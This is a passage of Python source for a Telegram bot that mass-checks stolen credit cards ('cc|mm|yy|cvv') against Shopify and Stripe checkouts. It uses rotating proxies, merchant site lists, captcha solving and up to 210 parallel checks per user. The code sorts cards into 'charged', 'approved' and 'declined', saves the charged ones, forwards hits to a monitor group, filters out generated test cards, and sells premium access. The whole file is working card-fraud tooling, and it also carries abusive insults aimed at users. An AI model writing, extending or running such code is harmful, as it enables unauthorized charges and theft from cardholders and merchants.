        gate_label    = _to_mi("Stripe Hitter" if gate_type == "stripe" else "Shopify")
        status_mi     = _to_mi(status_label)
        header_mi     = _to_mi(header_title)
        amount_mi     = _to_mi(str(amount))
        tds_line      = f"\n{_CE_GATE}  {_to_mi('3D Bypassed')}" if is_3d_bypassed else ""

        msg = (
            f"꒰ {_CE_HDR} ꒱  {header_mi}  ꒰ {_CE_HDR} ꒱\n"
            f"\n"
            f"{_CE_UNAME}  {uname_display}\n"
            f"{_CE_NAME}  {name_display}\n"
            f"\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"\n"
            f"{_CE_STATUS}  {status_mi}\n"
            f"{_CE_PRICE}  ${amount_mi}\n"
            f"{_CE_GATE}  {gate_label}"
            f"{tds_line}"
        )

        await bot.send_message(join_chat_id, msg, parse_mode="HTML")
    except Exception:
        pass


def _format_status_line(response: str) -> str:
    """Return the status header line for a given checker response."""
    rl = response.lower()
    if _is_charged_response(response):
        return f"{pe(E['gem'])} {bold('Order Placed!')}"
    elif any(k in rl for k in ["insufficient_funds", "insufficient funds"]):
        return f"{pe(E['check2'])} {bold('Insufficient Funds')}"
    elif any(k in rl for k in ["incorrect_cvc", "invalid_cvc", "incorrect_cvv", "invalid_cvv"]):
        return f"{pe(E['check3'])} {bold('CCN Live')}"
    elif any(k in rl for k in ["incorrect_zip"]):
        return f"{pe(E['check'])} {bold('ZIP Error — Live')}"
    elif "otp_required" in rl or "3ds" in rl:
        return f"{pe(E['check'])} {bold('3DS / OTP — Live')}"
    elif any(k in rl for k in ["card_declined", "do_not_honor", "declined"]):
        return f"{pe(E['cross'])} {bold('Declined')}"
    elif "expired" in rl:
        return f"{pe(E['cross2'])} {bold('Expired')}"
    elif "risky" in rl:
        return f"{pe(E['warn'])} {bold('Risky')}"
    elif "incorrect_number" in rl:
        return f"{pe(E['cross3'])} {bold('Dead')}"
    else:
        return f"{pe(E['warn2'])} {bold(response[:50])}"



# ══════════════════════════════════════════════════════════════════════════════
#  /cmds or /help COMMAND  (paginated — 3 pages to stay under 4096 char limit)
# ══════════════════════════════════════════════════════════════════════════════

def _help_page(page: int) -> tuple[str, dict]:
    """Return (text, reply_markup) for the given help page (1-based)."""
    TOTAL = 2

    def nav(p: int) -> dict:
        row = []
        if p > 1:
            row.append({
                "text": f"{bold('Back')}",
                "callback_data": f"helpp:{p - 1}",
                "icon_custom_emoji_id": N["arrow"],
                "style": "primary",
            })
        row.append({
            "text": f"{bold(str(p))} / {bold(str(TOTAL))}",
            "callback_data": "helpp:noop",
            "style": "danger",
        })
        if p < TOTAL:
            row.append({
                "text": f"{bold('Next')}",
                "callback_data": f"helpp:{p + 1}",
                "icon_custom_emoji_id": N["comet"],
                "style": "success",
            })
        home_row = [{
            "text": f"{bold('Home')}",
            "callback_data": "menu_home",
            "icon_custom_emoji_id": N["halo"],
            "style": "success",
        }]
        return {"inline_keyboard": [row, home_row]}

    if page == 1:
        text = (
            f"{pe('5156781758439490145')} {bold('GATE CONSOLE')} · {bold('1 / 2')}\n\n"
            f"{pe('5388595952451859597')} {bold('SHOPIFY PAYMENTS')}\n"
            f"{pe('5265004080916343533')} <code>/sh cc|mm|yy|cvv</code> — {bold('single check')}\n"
            f"{pe('5999340396432333728')} /chk — {bold('bulk from .txt (reply)')}\n\n"
            f"{pe('6282977077427702833')} {bold('STRIPE · /HITCO')}\n"
            f"{pe('5974235702701853774')} <code>/hitco link cc|mm|yy|cvv</code> — {bold('intent flow')}\n"
        )
    else:
        text = (
            f"{pe('5156781758439490145')} {bold('GATE CONSOLE')} · {bold('2 / 2')}\n\n"
            f"{pe('6321225560789877992')} {bold('PROXY / TOOLS')}\n"
            f"{pe('5292005513809126424')} <code>/proxy host:port:user:pass</code>\n"
            f"{pe('5474419676882686371')} /myproxy · /rmproxy\n"
            f"{pe('5474419676882686371')} /freeproxy · /freeproxylist\n"
            f"{pe('5974235702701853774')} <code>/bin 438854</code> — {bold('BIN lookup')}\n"
            f"{pe('5219971168429158186')} /redeem key — {bold('unlock premium')}\n\n"
            f"{pe('5309789538862774805')} {bold('CAPTCHA · NopeCHA')}\n"
            f"{pe('5285491959681527645')} <code>/nopecha api_key</code>\n"
            f"{pe('5285491959681527645')} /nopecha — {bold('status')} · /nopecha clear\n\n"
            f"{pe('5307858706250079424')} {bold('SYSTEM')}\n"
            f"{pe('5474419676882686371')} /start · /cmds\n\n"
            f"{pe('5467730450002746997')} {bold('ADMIN')}\n"
            f"{pe('5474419676882686371')} /admin id · /unadmin id\n"
            f"{pe('5474419676882686371')} /auth id · /unauth id\n"
            f"{pe('5418337668968760399')} /ban id · /unban id · /banned\n"
            f"{pe('6023660820544623088')} <code>/key users days</code>\n"
            f"{pe('5307858706250079424')} /api — {bold('external API toggles')}\n"
            f"{pe('5265004080916343533')} /broad — {bold('broadcast (owner)')}\n"
            f"{pe('5219971168429158186')} /sort — {bold('sort sites.txt (reply to .txt)')}\n"
            f"{pe('5219971168429158186')} /dead — {bold('dead sites auto-removed')}\n"

            f"{pe('5467516479027032033')} /sortstop — {bold('cancel running sort')}"
        )

    return text, nav(page)



@router.message(Command("cmds", "help"))
async def cmd_help(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return
    text, kb = _help_page(1)
    await message.reply(text, reply_markup=kb)


@router.callback_query(F.data.startswith("helpp:"))
async def cb_help_page(callback: types.CallbackQuery):
    raw = callback.data.split(":", 1)[1]
    if raw == "noop":
        await callback.answer()
        return
    try:
        page = int(raw)
    except ValueError:
        await callback.answer()
        return
    page = max(1, min(2, page))
    text, kb = _help_page(page)
    try:
        await safe_edit(callback.message, text, reply_markup=kb)
    except Exception:
        pass
    await callback.answer()


# ══════════════════════════════════════════════════════════════════════════════
#  CATCH-ALL for non-command messages (CC in plain text)
# ══════════════════════════════════════════════════════════════════════════════

@router.message(F.text & ~F.text.startswith("/"))
async def handle_plain_text(message: types.Message):
    """If a user sends raw CC(s) in PRIVATE chat, auto-detect and offer to check."""
    # Only in private chat
    if message.chat.type != "private":
        return

    text = message.text or ""

    # Try to find ALL CCs in the message
    from helpers import CC_PATTERN
    all_ccs = _DedupeList()
    for m in CC_PATTERN.finditer(text):
        cc = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        if cc not in all_ccs:
            all_ccs.append(cc)

    # Fallback: line-by-line
    if not all_ccs:
        for line in text.strip().splitlines():
            line = line.strip()
            parts = re.split(r'[|/]', line)
            if len(parts) >= 4:
                cc = "|".join(p.strip() for p in parts[:4])
                if cc not in all_ccs:
                    all_ccs.append(cc)

    if not all_ccs:
        return  # No CC found, ignore

    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    if len(all_ccs) == 1:
        # Single CC — quick check button
        cc_str = all_ccs[0]
        check_btn = {
            "inline_keyboard": [
                [{
                    "text": f"{bold('Check This CC')}",
                    "callback_data": f"quick_check:{cc_str}",
                    "icon_custom_emoji_id": "5229077409629752304",
                    "style": "primary",
                }],
            ]
        }
        await message.reply(
            f"{pe(E['sparkle'])} {bold('CC Detected!')}\n\n"
            f"{pe(E['bolt'])} <tg-spoiler>{cc_str}</tg-spoiler>\n\n"
            f"{pe(E['next'])} {bold('Tap below to check it.')}",
            reply_markup=check_btn,
        )
    else:
        # Multiple CCs — guide to file check
        preview = "\n".join(f"{pe(E['bolt'])} <tg-spoiler>{cc}</tg-spoiler>" for cc in all_ccs[:5])
        extra = ""
        if len(all_ccs) > 5:
            extra = f"\n{pe(E['next'])} {bold('...')} {bold(str(len(all_ccs) - 5))} {bold('more')}"
        await message.reply(
            f"{pe(E['sparkle'])} {bold(str(len(all_ccs)))} {bold('CCs Detected!')}\n\n"
            f"{preview}{extra}\n\n"
            f"{pe(E['next'])} {bold('Save them as a .txt and drop the file — the check auto-starts.')}"
        )


@router.callback_query(F.data.startswith("quick_check:"))
async def cb_quick_check(callback: types.CallbackQuery):
    cc_str = callback.data.split(":", 1)[1]
    user_id = callback.from_user.id

    # Check proxy
    proxy_data = get_user_proxy(user_id)
    if not proxy_data:
        await callback.answer(bold("Add a proxy first! Use /proxy"), show_alert=True)
        return

    await callback.answer()

    site = get_random_site()
    if not site:
        await callback.message.reply(
            f"{pe(E['cross'])} {bold('No sites available!')}"
        )
        return

    cc_number = cc_str.split("|")[0]
    bin_num = cc_number[:6]

    loading_msg = await callback.message.reply(
        f"{pe(E['loading'])} <b>{bold('GATE ENGAGED')}</b>\n"
        f"{BAR_TOP}\n"
        f"{pe(R['cc'])} {bold('card')}   <tg-spoiler>{cc_str}</tg-spoiler>\n"
        f"{pe(R['gate'])} {bold('node')}   <code>{site.split('//')[1][:34] if '//' in site else site[:34]}</code>\n"
        f"{BAR_MID}\n"
        f"<i>{bold('handshaking with shopify checkout')}</i>"
    )

    # ── Run check + BIN lookup in parallel (saves 2-10s) ──────────────────────
    _chk = asyncio.create_task(check_card_rotating(cc_str, proxy_data, site))
    _bin = asyncio.create_task(bin_lookup(bin_num))
    try:
        result = await _chk
    except Exception as e:
        result = {
            "Response": str(e)[:80],
            "Price": "-",
            "Gate": "-",
            "Status": "Error",
        }
    bin_info = await _bin

    # Format result (same logic as /sh)
    response = result.get("Response", "Unknown")
    price = result.get("Price", "-")
    gate = result.get("Gate", "-")

    rl = response.lower()
    _eid, _tag, _banner = classify_response(response, result)
    status_line = f"{pe(_eid)} <b>{bold(_tag)}</b>   {bold('/')}   <b>{bold(_banner)}</b>"
    result_text = render_result_card(
        cc_str, gate, price, response, result, bin_info,
        user_link(callback.from_user.id, callback.from_user.full_name, callback.from_user.username),
    )

    try:
        await safe_edit(loading_msg, result_text)
    except Exception:
        await callback.message.reply(result_text)

    # Pin if order placed / charged
    if _is_charged_response(response, result):
        auth.save_charged_cc(cc_str, user_id, (callback.from_user.full_name or "Unknown"), gate, str(price))
        try:
            await bot.pin_chat_message(callback.message.chat.id, loading_msg.message_id, disable_notification=True)
        except Exception:
            pass
        # Silent forward to monitor group
        try:
            await bot.send_message(auth.MONITOR_GROUP_ID, result_text)
        except Exception:
            pass


# ══════════════════════════════════════════════════════════════════════════════
#  AUTO-DETECT .txt FILE IN PRIVATE CHAT
# ══════════════════════════════════════════════════════════════════════════════

@router.message(F.document & F.chat.type.in_({"private"}))
async def handle_private_document(message: types.Message):
    """Auto-detect .txt CC files dropped in private chat."""
    doc = message.document
    if not doc or not doc.file_name or not doc.file_name.lower().endswith(".txt"):
        return

    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    # ── Filename ban-check ────────────────────────────────────────────────────
    if auth.is_banned(message.from_user.id):
        return
    if await guard_gen_filename(message, message.from_user.id):
        return

    # Download and count CCs
    try:
        from io import BytesIO
        buf = BytesIO()
        await bot.download(doc.file_id, destination=buf)
        buf.seek(0)
        file_text = buf.read().decode("utf-8", errors="ignore")
    except Exception:
        return

    from helpers import CC_PATTERN
    all_ccs = _DedupeList()
    for m in CC_PATTERN.finditer(file_text):
        cc = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        if cc not in all_ccs:
            all_ccs.append(cc)

    # Fallback: line-by-line
    if not all_ccs:
        for line in file_text.strip().splitlines():
            line = line.strip()
            parts = re.split(r'[|/]', line)
            if len(parts) >= 4:
                cc = "|".join(p.strip() for p in parts[:4])
                if cc not in all_ccs:
                    all_ccs.append(cc)

    if not all_ccs:
        await message.reply(
            f"{pe(E['cross'])} {bold('No valid CCs found in this file!')}"
        )
        return

    count = len(all_ccs)

    await message.reply(
        f"{pe(E['check'])} {bold('File Found')}\n"
        f"─────────────────────\n"
        f"{pe(E['bolt'])} {bold('Name')} → {bold(doc.file_name)}\n"
        f"{pe(E['gem'])} {bold('Lines')} → {bold(str(count))}\n"
        f"─────────────────────\n"
        f"{pe(E['next'])} {bold('Reply')} /chk {bold('to mass check')}\n"
        f"{pe(E['next'])} {bold('Or use')} /sh cc|mm|yy|cvv {bold('for a single card')}"
    )


@router.callback_query(F.data.startswith("quick_ran:"))
async def cb_quick_ran(callback: types.CallbackQuery):
    """Handle the Check button from auto-detected .txt files in private chat."""
    user_id = callback.from_user.id

    if auth.is_banned(user_id):
        return

    if not auth.has_premium_access(user_id, callback.message.chat.id):
        await callback.answer(bold("Premium required! /redeem or contact admin"), show_alert=True)
        return

    proxy_data = get_user_proxy(user_id)
    if not proxy_data:
        await callback.answer(bold("Add a proxy first! Use /proxy"), show_alert=True)
        return

    await callback.answer()

    # Get the original message that had the .txt file
    orig_msg = callback.message.reply_to_message
    if not orig_msg or not orig_msg.document:
        await callback.message.reply(
            f"{pe(E['cross'])} {bold('Original file not found!')}"
        )
        return

    doc = orig_msg.document
    if not doc.file_name or not doc.file_name.lower().endswith(".txt"):
        await callback.message.reply(
            f"{pe(E['cross'])} {bold('Only .txt files are supported!')}"
        )
        return

    # ── Filename ban-check ────────────────────────────────────────────────────
    if await guard_gen_filename(callback.message, user_id):
        return

    # Download file
    try:
        from io import BytesIO
        buf = BytesIO()
        await bot.download(doc.file_id, destination=buf)
        buf.seek(0)
        file_text = buf.read().decode("utf-8", errors="ignore")
    except Exception:
        await callback.message.reply(
            f"{pe(E['cross'])} {bold('Failed to download file!')}"
        )
        return

    # Extract CCs
    from helpers import CC_PATTERN
    all_ccs = _DedupeList()
    for m in CC_PATTERN.finditer(file_text):
        cc = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        if cc not in all_ccs:
            all_ccs.append(cc)

    if not all_ccs:
        for line in file_text.strip().splitlines():
            line = line.strip()
            parts = re.split(r'[|/]', line)
            if len(parts) >= 4:
                cc = "|".join(p.strip() for p in parts[:4])
                if cc not in all_ccs:
                    all_ccs.append(cc)

    if not all_ccs:
        await callback.message.reply(
            f"{pe(E['cross'])} {bold('No CCs found in the file!')}"
        )
        return

    user_name = callback.from_user.full_name or ""
    user_uname = callback.from_user.username or ""

    # Apply CC limit
    cc_limit = auth.get_cc_limit(user_id)
    if len(all_ccs) > cc_limit:
        all_ccs = all_ccs[:cc_limit]

    # ── Gen-checker detection ─────────────────────────────────────────────────
    if not await guard_gen_cards(all_ccs, callback.message, user_id):
        return

    total = len(all_ccs)
    chat_id = callback.message.chat.id

    # ── Block duplicate runs ──────────────────────────────────────────────────
    if user_id in _RAN_ACTIVE_USERS:
        await callback.message.reply(
            f"{pe(E['warn'])} {bold('MF! Your file check already in progress!')}\n\n"
            f"{pe(E['next'])} {bold('Wait for it to complete or tap')} {bold('Stop Checking')} {bold('first.')}"
        )
        return

    stop_key = f"{chat_id}:{user_id}"
    _RAN_STOP_FLAGS[stop_key] = False
    _RAN_ACTIVE_USERS.add(user_id)

    try:
        stop_btn = {
            "inline_keyboard": [[{
                "text": f"{bold('Stop Checking')}",
                "callback_data": f"ran_stop:{stop_key}",
                "icon_custom_emoji_id": E["stop"],
                "style": "danger",
            }]]
        }

        status_msg = await callback.message.reply(
            f"{pe(E['rocket'])} {bold('File Check Started!')} {pe(E['dice'])}\n\n"
            f"{pe(E['bolt'])} {bold('Total CCs:')} {bold(str(total))}\n"
            f"{pe(E['refresh'])} {bold('Random proxy + site per CC')}\n"
            f"{pe(E['star'])} {bold('Auto-retry on dead sites')}\n\n"
            f"{pe(R['checked_by'])} {bold('Checked by:')} {user_link(user_id, user_name, user_uname)}",
            reply_markup=stop_btn,
        )

        await _process_ran_cards(all_ccs, user_id, user_name, user_uname, chat_id, status_msg, stop_key)
    finally:
        _RAN_ACTIVE_USERS.discard(user_id)


# ══════════════════════════════════════════════════════════════════════════════
#  /ran COMMAND — File-based CC Check (high parallel, approved only)
# ══════════════════════════════════════════════════════════════════════════════

_DEAD_INDICATORS = (
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error',
    'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
    'site dead', 'captcha_required', 'captcha required', 'site errors',
    'all products sold out', 'no_session_token', 'tokenize_fail',
    'proxy dead',
)

_APPROVED_INDICATORS = (
    'order completed', 'order_placed', 'processedreceipt', '💎',
    'insufficient_funds', 'insufficient funds',
    'incorrect_cvc', 'invalid_cvc', 'incorrect_cvv', 'invalid_cvv',
    'incorrect_zip',
)

_RAN_STOP_FLAGS: dict[str, bool] = {}   # "chat_id:user_id" -> stop flag
_RAN_ACTIVE_USERS: set[int] = set()      # user IDs with an active /chk in progress
_RAN_FILES: dict[str, dict] = {}         # stop_key -> per-category CC lists for download/retry
# Tuned for 40–70 proxy pool + up to 15 concurrent users:
#   Target ≈ 3 concurrent checks per proxy → 70 proxies × 3 ≈ 210 per user.
#   Global ceiling keeps 15 heavy users civil (~1500 in-flight max).
#   With ~10–14 s avg per check, 5000 CCs finish in ~8–12 min solo,
#   ~18–22 min under full 15-user load.
RAN_PER_USER = 210                       # parallel checks per /chk session
_RAN_GLOBAL_LIMIT = 1800                 # max /chk checks across ALL users at once
_ran_global_sem = asyncio.Semaphore(_RAN_GLOBAL_LIMIT)

_ran_user_sems: dict[int, asyncio.Semaphore] = {}


def get_ran_user_semaphore(user_id: int) -> asyncio.Semaphore:
    if user_id not in _ran_user_sems:
        _ran_user_sems[user_id] = asyncio.Semaphore(RAN_PER_USER)
    return _ran_user_sems[user_id]


def release_ran_user_semaphore(user_id: int):
    _ran_user_sems.pop(user_id, None)


async def _ran_check_one(
    cc_str: str, site: str, proxy_list: list, sites_list: list, user_id: int,
) -> dict:
    """Run one /chk check with global + per-user limits (not shared /sh /msh sem)."""
    proxy_data = random.choice(proxy_list) if proxy_list else None
    user_sem = get_ran_user_semaphore(user_id)

    # NOTE: checker_bridge → shopify_check_with_fallback already retries on dead
    # sites internally, so we do NOT add a second full retry here. Doing both
    # meant one CC could chain up to ~10 timeouts and freeze a worker for minutes.
    async with _ran_global_sem:
        async with user_sem:
            try:
                result = await check_card_rotating(cc_str, proxy_data, site, proxy_list=proxy_list)
            except Exception as e:
                result = {"Response": str(e)[:80], "Price": "-", "Gate": "-"}

    return result


async def _deliver_ran_hit(
    cc: str, result: dict, raw_response: str, is_charged: bool,
    user_id: int, user_name: str, user_uname: str, chat_id: int,
):
    """Send hit messages in background so workers keep checking."""
    try:
        gate = result.get("Gate", "-")
        price = result.get("Price", "-")
        bin_num = cc.split("|")[0][:6]
        bin_info = await bin_lookup(bin_num)
        status_line = _format_status_line(raw_response)

        _hdr_r, _hl_r, _ = _header_tag_for(raw_response)
        hit_text = render_sparkle_card(
            cc, "Shopify Payments", price, raw_response, result,
            bin_info, user_link(user_id, user_name, user_uname),
            _hdr_r, is_decline=(not _hl_r),
        )

        # GIF on EVERY outcome — charged, live, declined, unknown.
        sent_msg = await send_hit_animation(chat_id, hit_text)

        if sent_msg is None:
            sent_msg = await bot.send_message(chat_id, hit_text)
        if is_charged:
            try:
                await bot.pin_chat_message(chat_id, sent_msg.message_id, disable_notification=True)
            except Exception:
                pass
            auth.save_charged_cc(cc, user_id, user_name, gate, str(price))
            try:
                await bot.send_message(auth.MONITOR_GROUP_ID, hit_text)
            except Exception:
                pass
            # Charged notification to join channel
            await _send_charged_notification(
                user_id=user_id,
                username=user_uname or "",
                full_name=user_name or "",
                amount=str(price),
                gate_type="shopify",
            )
        else:
            await _send_approved(hit_text)
            # Insufficient Funds notification to join channel
            _raw_lo = raw_response.lower()
            if any(k in _raw_lo for k in ["insufficient_funds", "insufficient funds"]):
                await _send_charged_notification(
                    user_id=user_id,
                    username=user_uname or "",
                    full_name=user_name or "",
                    amount=str(price),
                    gate_type="shopify",
                    status_label="Insufficient Funds",
                    header_title="INSUFFICIENT FUNDS",
                )
    except Exception:
        pass


async def _process_ran_cards(
    all_ccs: list, user_id: int, user_name: str, user_uname: str, chat_id: int,
    status_msg: types.Message, stop_key: str,
):
    """Process /chk with a worker pool — always N cards in flight, non-blocking hits."""
    total = len(all_ccs)
    checked, approved, charged, declined, skipped, errors = 0, 0, 0, 0, 0, 0
    _res_charged, _res_approved, _res_declined, _res_errors = [], [], [], []
    _start_time = time.time()
    _last_status_edit = 0.0
    _state_lock = asyncio.Lock()
    _edit_lock   = asyncio.Lock()   # prevents concurrent safe_edit calls on status_msg
    _last_response = "-"
    _last_cc = ""

    sites_list = _load_sites()
    proxy_list = get_effective_proxies(user_id)

    if not sites_list:
        try:
            await safe_edit(status_msg, f"{pe(E['cross'])} {bold('No sites available!')}")
        except Exception:
            pass
        return

    if not proxy_list:
        try:
            await safe_edit(status_msg, f"{pe(E['cross'])} {bold('No proxies set!')}")
        except Exception:
            pass
        return

    cc_queue: asyncio.Queue[str] = asyncio.Queue()
    for cc in all_ccs:
        cc_queue.put_nowait(cc)

    async def _maybe_update_status(force: bool = False):
        nonlocal _last_status_edit
        # Fast pre-check without lock to avoid contention on every CC result
        _now = time.time()
        if not force and _now - _last_status_edit < 4 and checked + skipped < total:
            return
        # Lock ensures only ONE worker edits at a time — prevents FloodWait cascade
        if _edit_lock.locked() and not force:
            return
        async with _edit_lock:
            # Re-check inside the lock (another worker may have just edited)
            _now = time.time()
            if not force and _now - _last_status_edit < 4 and checked + skipped < total:
                return
            _last_status_edit = _now

        stop_btn = {
            "inline_keyboard": [[{
                "text": f"{bold('Stop Checking')}",
                "callback_data": f"ran_stop:{stop_key}",
                "icon_custom_emoji_id": E["stop"],
                "style": "danger",
            }]]
        }
        _done = checked + skipped
        _pct  = int((_done / total) * 100) if total else 0
        _bar_w = 10
        _fill = int((_pct / 100) * _bar_w)
        _bar = "🟦" * _fill + "⬜️" * (_bar_w - _fill)
        _el = int(time.time() - _start_time)
        _el_str = f"{_el // 60}m {_el % 60}s" if _el >= 60 else f"{_el}s"
        progress_text = (
            f"{pe(N['diamond'])} {bold('Autoshopify')} {pe(N['diamond'])}\n"
            f"{pe(N['pulse'])} {bold('Status')} → {bold('CHECKING')}\n"
            "─────────────────────\n"
            f"[{_bar}] {bold(str(_pct))}{bold('%')}\n"
            f"{pe(N['grid'])} {bold('Checked')} → {bold(str(_done))}/{bold(str(total))}\n"
            f"{pe(N['shield'])} {bold('Approved')} → {bold(str(approved))}   "
            f"{pe(N['coin'])} {bold('Charged')} → {bold(str(charged))}   "
            f"{pe(N['ember'])} {bold('Decline')} → {bold(str(declined))}   "
            f"{pe(N['flare'])} {bold('Errors')} → {bold('0')}\n"
            f"{pe(N['orbit'])} {bold('Time')} → {bold(_el_str)}\n"
            f"{pe(N['core'])} {bold('User')} → {user_link(user_id, user_name, user_uname)}"
        )
        try:
            if checked + skipped >= total:
                await safe_edit(status_msg, progress_text)
            else:
                await safe_edit(status_msg, progress_text, reply_markup=stop_btn)
        except Exception:
            pass

    async def worker():
        nonlocal checked, approved, charged, declined, skipped, errors, _last_response, _last_cc
        while not _RAN_STOP_FLAGS.get(stop_key):
            try:
                cc = cc_queue.get_nowait()
            except asyncio.QueueEmpty:
                break

            site = random.choice(sites_list)
            result = await _ran_check_one(cc, site, proxy_list, sites_list, user_id)

            if _RAN_STOP_FLAGS.get(stop_key):
                async with _state_lock:
                    skipped += 1
                cc_queue.task_done()
                continue

            raw_response = result.get("Response") or "Unknown"
            response = raw_response.lower()
            is_charged = _is_charged_response(raw_response, result)
            is_approved = any(ind in response for ind in _APPROVED_INDICATORS)
            is_error = (result.get("Status") == "Error") or any(
                k in response for k in ("error", "timeout", "timed out", "exception", "connection", "proxy")
            )
            should_send_hit = False

            async with _state_lock:
                checked += 1
                _last_response = raw_response
                _last_cc = cc
                if is_charged:
                    charged += 1
                    approved += 1
                    _res_charged.append(cc)
                    _res_approved.append(cc)
                    should_send_hit = True
                elif is_approved:
                    approved += 1
                    _res_approved.append(cc)
                    should_send_hit = True
                elif is_error:
                    errors += 1
                    _res_errors.append(cc)
                else:
                    declined += 1
                    _res_declined.append(cc)

            if should_send_hit:
                asyncio.create_task(_deliver_ran_hit(
                    cc, result, raw_response, is_charged,
                    user_id, user_name, user_uname, chat_id,
                ))

            await _maybe_update_status()
            cc_queue.task_done()

    try:
        worker_count = min(RAN_PER_USER, total)
        await asyncio.gather(
            *[asyncio.create_task(worker()) for _ in range(worker_count)],
            return_exceptions=True,
        )
        await _maybe_update_status(force=True)
    finally:
        _RAN_STOP_FLAGS.pop(stop_key, None)
        release_ran_user_semaphore(user_id)

    # Final summary — Autoshopify FINISHED card + result file buttons
    _elapsed = int(time.time() - _start_time)
    _elapsed_str = f"{_elapsed // 60}m {_elapsed % 60}s" if _elapsed >= 60 else f"{_elapsed}s"
    _n_err = errors + skipped
    _bar_full = "🟦" * 10
    _RAN_FILES[stop_key] = {
        "charged": _res_charged, "approved": _res_approved,
        "declined": _res_declined, "errors": _res_errors,
        "user_id": user_id, "user_name": user_name,
        "user_uname": user_uname, "chat_id": chat_id,
    }
    final_kb = {
        "inline_keyboard": [
            [
                {"text": f"{bold('Charged')} ({charged})", "callback_data": f"ran_dl:{stop_key}:charged",
                 "icon_custom_emoji_id": E["gem"], "style": "primary"},
                {"text": f"{bold('Approved')} ({approved})", "callback_data": f"ran_dl:{stop_key}:approved",
                 "icon_custom_emoji_id": E["check"], "style": "success"},
            ],
            [
                {"text": f"{bold('Decline')} ({declined})", "callback_data": f"ran_dl:{stop_key}:declined",
                 "icon_custom_emoji_id": E["cross"], "style": "danger"},
            ],
            [
                {"text": f"{bold('Retry Errors')} ({_n_err})", "callback_data": f"ran_retry:{stop_key}",
                 "icon_custom_emoji_id": "4992597150262101203", "style": "primary"},
            ],
        ]
    }
    try:
        await safe_edit(status_msg,
            f"{pe(N['diamond'])} {bold('Autoshopify')} {pe(N['diamond'])}\n"
            f"{pe(N['pulse'])} {bold('Status')} → {bold('FINISHED')}\n"
            "─────────────────────\n"
            f"[{_bar_full}] {bold('100%')}\n"
            f"{pe(N['grid'])} {bold('Checked')} → {bold(str(total))}/{bold(str(total))}\n"
            f"{pe(N['shield'])} {bold('Approved')} → {bold(str(approved))}   "
            f"{pe(N['coin'])} {bold('Charged')} → {bold(str(charged))}   "
            f"{pe(N['ember'])} {bold('Decline')} → {bold(str(declined))}   "
            f"{pe(N['flare'])} {bold('Errors')} → {bold('0')}\n"
            f"{pe(N['orbit'])} {bold('Time')} → {bold(_elapsed_str)}\n"
            f"{pe(N['core'])} {bold('User')} → {user_link(user_id, user_name, user_uname)}",
            reply_markup=final_kb,
        )
    except Exception:
        pass


@router.callback_query(F.data.startswith("ran_stop:"))
async def cb_ran_stop(callback: types.CallbackQuery):
    stop_key = callback.data.split(":", 1)[1]
    clicker_id = callback.from_user.id

    try:
        owner_id = int(stop_key.split(":")[-1])
    except (ValueError, IndexError):
        owner_id = 0

    if clicker_id != owner_id and not auth.is_admin(clicker_id):
        await callback.answer(bold("Madarcod apny kaam kr !"), show_alert=True)
        return

    _RAN_STOP_FLAGS[stop_key] = True
    await callback.answer(bold("Stopping..."), show_alert=False)
    try:
        await callback.message.edit_reply_markup(reply_markup=None)
    except Exception:
        pass


@router.callback_query(F.data.startswith("ran_dl:"))
async def cb_ran_download(callback: types.CallbackQuery):
    """Send the requested category as a .txt file."""
    try:
        _rest, key, cat = callback.data.split(":", 2)
    except ValueError:
        await callback.answer()
        return
    entry = _RAN_FILES.get(key)
    if not entry:
        await callback.answer(bold("Run data expired!"), show_alert=True)
        return
    if callback.from_user.id != entry["user_id"] and not auth.is_admin(callback.from_user.id) and not auth.is_owner(callback.from_user.id):
        await callback.answer(bold("Madarcod apny kaam kr !"), show_alert=True)
        return
    cards = entry.get(cat) or []
    if not cards:
        await callback.answer(bold(f"No {cat} cards in this run!"), show_alert=True)
        return
    from aiogram.types import BufferedInputFile
    payload = "\n".join(cards).encode("utf-8")
    await callback.answer()
    try:
        await bot.send_document(
            callback.message.chat.id,
            BufferedInputFile(payload, filename=f"{cat}_{len(cards)}.txt"),
            caption=f"{pe(E['sparkle'])} {bold(cat.capitalize())} — {bold(str(len(cards)))} {bold('cards')}",
        )
    except Exception:
        pass


@router.callback_query(F.data.startswith("ran_retry:"))
async def cb_ran_retry(callback: types.CallbackQuery):
    """Re-check only the error cards from a finished run."""
    key = callback.data.split(":", 1)[1]
    entry = _RAN_FILES.get(key)
    if not entry:
        await callback.answer(bold("Run data expired!"), show_alert=True)
        return
    user_id = entry["user_id"]
    if callback.from_user.id != user_id and not auth.is_admin(callback.from_user.id) and not auth.is_owner(callback.from_user.id):
        await callback.answer(bold("Madarcod apny kaam kr !"), show_alert=True)
        return
    cards = entry.get("errors") or []
    if not cards:
        await callback.answer(bold("No error cards to retry!"), show_alert=True)
        return
    entry["errors"] = []
    await callback.answer()
    new_key = f"retry:{callback.message.chat.id}:{user_id}"
    status_msg = await callback.message.reply(
        f"{pe(E['loading'])} {bold('Retrying')} {bold(str(len(cards)))} {bold('error cards...')}"
    )
    asyncio.create_task(_process_ran_cards(
        cards, user_id, entry["user_name"], entry["user_uname"],
        callback.message.chat.id, status_msg, new_key,
    ))


@router.message(Command("chk", "ran"))
async def cmd_ran(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
